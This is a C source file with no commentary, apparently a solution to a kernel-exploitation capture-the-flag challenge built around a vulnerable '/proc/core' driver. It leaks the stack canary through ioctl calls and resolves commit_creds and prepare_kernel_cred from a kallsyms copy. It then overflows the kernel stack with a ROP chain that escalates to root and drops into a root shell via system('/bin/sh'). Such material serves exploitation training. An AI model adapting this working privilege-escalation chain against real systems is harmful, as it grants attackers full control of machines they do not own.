#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff813eb448

void *commit_creds = NULL, *prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__ volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. "
         "Execve root shell now...\033[0m");
    system("/bin/sh");
}

void coreRead(int fd, char * buf)
{
    ioctl(fd, 0x6677889B, buf);
}

void setOffValue(int fd, size_t off)
{
    ioctl(fd, 0x6677889C, off);
}

void coreCopyFunc(int fd, size_t nbytes)
{
    ioctl(fd, 0x6677889A, nbytes);
}

int main(int argc, char ** argv)
{
    char buf[0x50], type[0x10];
    size_t addr, offset, canary;
    FILE* sym_table_fd;
    size_t rop_chain[0x100], i;
    int fd;

    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();

    fd = open("/proc/core", 2);
    if(fd <0) {
        puts("\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m");
        exit(EXIT_FAILURE);
    }

    /* get the addr */
    sym_table_fd = fopen("/tmp/kallsyms", "r");
    if(sym_table_fd < 0) {
        puts("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m");
        exit(EXIT_FAILURE);
    }
    
    while(fscanf(sym_table_fd, "%lx%s%s", &addr, type, buf)) {
        if(prepare_kernel_cred && commit_creds) {
            break;
        }

        if(!commit_creds && !strcmp(buf, "commit_creds")) {
            commit_creds = (void*) addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of "
                   "commit_cred:\033[0m%p\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred")) {
            prepare_kernel_cred = (void*) addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of "
                   "prepare_kernel_cred:\033[0m%p\n", prepare_kernel_cred);
            continue;
        }
    }

    offset = (size_t) commit_creds - 0xffffffff8109c8e0;

    /* read the canary */
    canary;
    setOffValue(fd, 64);
    coreRead(fd, buf);
    canary = ((size_t *)buf)[0];

    /* construct the ropchain and trigger */
    for (i = 0; i < 10;i++) {
        rop_chain[i] = canary;
    }
    rop_chain[i++] = (size_t) getRootPrivilige;
    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = IRETQ + offset;
    rop_chain[i++] = (size_t) getRootShell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;

    write(fd, rop_chain, 0x800);
    coreCopyFunc(fd, 0xffffffffffff0000 | (0x100));
}